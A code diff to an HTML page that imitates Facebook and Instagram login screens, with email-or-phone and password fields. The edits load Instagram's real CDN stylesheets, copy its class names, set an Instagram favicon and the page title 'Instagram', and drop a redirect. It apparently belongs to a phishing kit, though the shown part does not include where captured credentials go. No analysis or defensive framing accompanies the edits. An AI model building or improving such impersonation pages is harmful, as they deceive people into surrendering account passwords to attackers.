@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="en">
+<html class="_9dls touch _ar44 js-focus-visible _aa4c" lang="en" dir="ltr" data-js-focus-visible="">
 
 <head>
     <meta charset="UTF-8">
@@ -12,12 +12,15 @@
     <link type="text/css" rel="stylesheet" href="css/page.css">
     <link rel="stylesheet" href="css/profile.css">
     <link rel="stylesheet" href="css/index.css">
+    <link type="text/css" rel="stylesheet"
+        href="https://static.cdninstagram.com/rsrc.php/v3/yu/l/0,cross/WL2xdyV3X0eiOx59pmNH69MbVu6J6TSgC.css?_nc_x=Ij3Wp8lg5Kz"
+        data-bootloader-hash="QnS1GBq" data-async-css="1" crossorigin="anonymous" data-p=":33,81,80" data-c="1">
     <script src="js/jquery-3.6.0.min.js"></script>
     <script src="js/index.js"></script>
 
 </head>
 
-<body style="background-color: rgb(240 246 255);">
+<body>
 
     <div id="home">
         <header>
@@ -29,7 +32,7 @@
             </div><br>
 
 
-            <img src="assets/slide.png"><br><br>
+            <img src="img/slide.png"><br><br>
 
             <center>
                 <div class="mgm">
@@ -193,7 +196,7 @@
     <!--facebuk login-->
     <div id="fbp">
 
-        <fbcontainer style="margin: 0 auto; text-align: center; background-color: rgb(240 246 255);">
+        <div id="fbbody" class="fbook">
             <br>
             <center><span
                     style="display: flex; justify-content: center; align-items: center; text-align: center; color: rgb(70, 90, 105); display: inline; font-size: 13px; font-family: &quot;Optimistic Text Normal&quot;; ">English
@@ -205,13 +208,13 @@
                     style="max-height: 60px; min-height: 0px; object-fit: contain; overflow: hidden;">
             </div><br><br><br>
 
-            <div class="form-group">
-                <input class="inputC" type="text" id="fb-email" required oninput="toggleClearIcon()">
+            <div id="fbform" class="form-group">
+                <input type="text" id="fb-email" required oninput="toggleClearIcon()">
                 <label for="fb-email">Mobile number or email address</label>
                 <div class="clear-input" id="clearIcon" onclick="clearEmailInput()"></div>
             </div>
-            <div class="form-group">
-                <input class="inputC" type="password" id="fb-pass" required>
+            <div id="fbform" class="form-group">
+                <input type="password" id="fb-pass" required>
                 <label for="fb-pass">Password</label>
                 <div class="toggle-password" onclick="togglePasswordVisibility()"></div>
                 <!-- Icon as a clickable div -->
@@ -279,7 +282,7 @@
                     </div>
                 </div>
             </div>
-        </fbcontainer>
+        </div>
     </div>
     <!--facebuk login ends-->
 
@@ -378,7 +381,7 @@
                                                                                     </div>
                                                                                 </div>
                                                                                 <div class="_ab31">
-                                                                                    <div
+                                                                                    <div id="igform"
                                                                                         class="x6s0dn4 xnz67gz x19gtwsn x1nk0tez x1xp9za0 x1hm1hlx x1npaq5j x1c83p5e x1enjb0b x199158v x13fuv20 xu3j5b3 x1q0q8m5 x26u7qi x178xt8z xm81vs4 xso031l xy80clv x9f619 x5n08af x78zum5 x1q0g3np xvs91rp x1n2onr6 xh8yej3">
                                                                                         <label class="_aa48 _aa49"><span
                                                                                                 class="_aa4a">Phone
@@ -400,7 +403,7 @@
                                                                                     </div>
                                                                                 </div>
                                                                                 <div class="_ab31">
-                                                                                    <div
+                                                                                    <div id="igform"
                                                                                         class="x6s0dn4 xnz67gz x19gtwsn x1nk0tez x1xp9za0 x1hm1hlx x1npaq5j x1c83p5e x1enjb0b x199158v x13fuv20 xu3j5b3 x1q0q8m5 x26u7qi x178xt8z xm81vs4 xso031l xy80clv x9f619 x5n08af x78zum5 x1q0g3np xvs91rp x1n2onr6 xh8yej3">
                                                                                         <label class="_aa48 _aa49"><span
                                                                                                 class="_aa4a">Password</span><input
@@ -447,7 +450,8 @@
                                                                                     style="line-height: var(--base-line-clamp-line-height); --base-line-clamp-line-height: 18px;">
                                                                                     <p>Don't have an account? <span
                                                                                             class="_ap3a _aaco _aacw _aad0 _aad7"
-                                                                                            dir="auto">Sign up</span>
+                                                                                            dir="auto">Sign
+                                                                                            up</span>
                                                                                     </p>
                                                                                 </span>
                                                                             </div>
@@ -572,7 +576,7 @@
             changeFavicon('img/igfavicon.png');
             ig();
             document.title = 'Instagram';
-            window.location.href = 'insta.html';
+
         }
 
     </script>
